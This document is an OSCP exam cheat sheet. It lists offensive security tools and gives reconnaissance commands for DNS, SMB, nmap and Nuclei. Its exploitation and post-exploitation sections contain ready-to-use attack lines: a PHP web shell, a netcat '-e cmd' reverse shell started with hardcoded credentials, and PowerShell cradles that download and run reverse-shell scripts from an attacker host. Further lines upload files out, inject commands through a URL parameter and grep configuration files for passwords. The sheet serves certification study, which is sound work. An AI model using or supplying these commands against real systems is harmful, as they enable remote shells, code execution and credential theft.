# OSCP Cheat Sheet
Commands, Payloads and Resources for the Offensive Security Certified Professional Certification.

## Resources

### Basics
| Tool | URL |
| --- | --- |
| Impacket | https://github.com/SecureAuthCorp/impacket |

### Information Gathering
| Tool | URL |
| --- | --- |
| Amass | https://github.com/OWASP/Amass |
| AutoRecon | https://github.com/Tib3rius/AutoRecon |
| Sparta | https://github.com/SECFORCE/sparta |
| enum4linux | https://github.com/CiscoCXSecurity/enum4linux |

### Vulnerability Analysis
| Tool | URL |
| --- | --- |
| Nmap | https://github.com/nmap/nmap |
| Nuclei | https://github.com/projectdiscovery/nuclei |
| WPScan | https://github.com/wpscanteam/wpscan |

### Web Application Analysis
| Tool | URL |
| --- | --- |

### Database Assessment
| Tool | URL |
| --- | --- |

### Password Attacks
| Tool | URL |
| --- | --- |
| CrackMapExec | https://github.com/byt3bl33d3r/CrackMapExec |

### Reverse Engineering
| Tool | URL |
| --- | --- |

### Exploitation Tools
| Tool | URL |
| --- | --- |
| Metasploit | https://github.com/rapid7/metasploit-framework |

### Post Exploitation
| Tool | URL |
| --- | --- |
| PEASS-ng | https://github.com/carlospolop/PEASS-ng |
| LinEnum | https://github.com/rebootuser/LinEnum |
| pspy | https://github.com/DominicBreuker/pspy |
| Watson | https://github.com/rasta-mouse/Watson |
| WESNG | https://github.com/bitsadmin/wesng
| Sherlock | https://github.com/sherlock-project/sherlock |
| nishang | https://github.com/samratashok/nishang |
| Empire | https://github.com/BC-SECURITY/Empire |
| LaZagne | https://github.com/AlessandroZ/LaZagne |
| printspoofer | https://github.com/dievus/printspoofer |
| Rotten Potato | https://github.com/breenmachine/RottenPotatoNG |
| JAWS | https://github.com/411Hall/JAWS |
| Windows-privesc-check | https://github.com/pentestmonkey/windows-privesc-check |
| Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |
| Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
| Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
| Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |

### Forensics
| Tool | URL |
| --- | --- |

### Exploiting
| Tool | URL |
| --- | --- |
| PwnTools | https://github.com/Gallopsled/pwntools |
| mona | https://github.com/corelan/mona |
| Buffer Overflow | https://github.com/gh0x0st/Buffer_Overflow |

### Wordlists
| Tool | URL |
| --- | --- |
| SecLists | https://github.com/danielmiessler/SecLists |

### Social Media Resources
| Name | URL |
| --- | --- |
| IppSec (YouTube) | https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA |
| IppSec.rocks | https://ippsec.rocks/?# |
| 0xdf | https://0xdf.gitlab.io/
| HackTricks | https://book.hacktricks.xyz/ |
| Hacking Articles | https://www.hackingarticles.in/ |
| Rana Khalil | https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/ |

## Commands

### Basics
#### Basic Enumeration / Linux
id
sudo -l
#### Basic Enumeration / Windows
```c
systeminfo
whoami /all
net users
net users <user>
```
#### grep for Passwords
#### vi
```c
:w !sudo tee %    # save file with evelated privileges without exiting
```

#### tmux
```c
ctrl b + w    # navigate
```
Copy & Paste
```c
1. ctrl b + [
2. ctrl space
3. alt w
4. ctrl b + ]
```
Search
```c
ctrl b + [    # enter copy
ctrl + s      # enter search from copy mode
ctrl + r      # reverse search
```

### Information Gathering
#### DNS
##### Reverse DNS
```c
whois <domain>
host <remote_ip> <remote_ip>
host -l <domain> <remote_ip>
dig @<domain> -x <domain>
dig {a|txt|ns|mx} <domain>
dig {a|txt|ns|mx} <domain> @ns1.<domain>
dig axfr @<remote_ip> <domain>           # zone transfer - needs tcp DNS - port 53
```
#### SMB / Netbios
```c
nbtscan <remote_ip>
enum4linux -a <remote_ip>
```

### Vulnerability Analysis
#### Nmap:
```c
sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <remote_ip>    # discovery scan
sudo nmap -A -T4 -sC -sV --script vuln <remote_ip>    # vulnerability scan
sudo nmap -sU <remote_ip>    # udp scan
sudo nmap -sC -sV -p- --scan-delay 5s <remote_ip>    # delayed scan
sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <remote_ip>    # kerberos enumeration
ls -lh /usr/share/nmap/scripts/*ssh*
locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
```
#### Nuclei
```c
./nuclei -target https://<target_url> -t nuclei-templates    # basic syntax with path to templates
./nuclei -target https://<target_url> -t nuclei-templates -rate-limit 5    # rate limiting
./nuclei -target https://<target_url> -t nuclei-templates -header 'User-Agent: Pentesting -H 'X-OSCP-EXAM: oscp_exam'    # set headers
```
#### WPScan
```c

```



### Exploitation Tools
#### Web Shells
```c
/usr/share/webshells
<?php echo shell_exe(($_GET['cmd']); ?>
```

### Post Exploitation
#### autologon
```c
powershell -c "$SecPass = Convertto-securestring 'Welcome1!' -AsPlainText -Force;$cred=New-Object System.Management.Automation.PScredential('administrator', $SecPass);Start-Process -FilePath 'C:\Users\Public\Downloads\nc.exe' -argumentlist '-e cmd <local_ip> <local_port>' -Credential $cred"
```
```c
grep -roiE "password.{20}"
grep -oiE "password.{20}" /etc/*.conf
```
#### Powershell & Powercat
```c
Set-ExecutionPolicy Unrestricted

powershell -Command "$PSVersionTable.PSVersion"    # check powershell version

powershell -c "[Environment]::Is64BitProcess"    # check for 64bit powershell

cmd /c powershell -nop -exec bypass -c "iex(new-object net.webclient).downloadstring('http://<local_ip>:<local_port>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <local_ip> -Port <local_port>"

powershell -c "(new-object System.Net.WebClient).DownloadFile(\"http://<local_ip>:<local_port>/nc.exe\",\"C:\Users\Public\Downloads\nc.exe\")"

powershell (New-Object System.Net.WebClient).UploadFile('http://<local_ip>/upload.php', '<file>')

powershell -c "Invoke-Webrequest -Uri \"http://<local_ip>:<local_port>/shell.exe\" -OutFile \"C:\Users\Public\Downloads\shell.exe\""

<remote_ip>/node/3?cmd=powershell -c IEX(New-object System.net.webclient).DownloadString('http://<local_ip>:<local:port>/Sherlock.ps1');Find-AllVulns

echo "IEX (New-object System.net.webclient).DownloadString('http://<local_ip>:<local_port>/shell.ps1')" | powershell -noprofile -
```










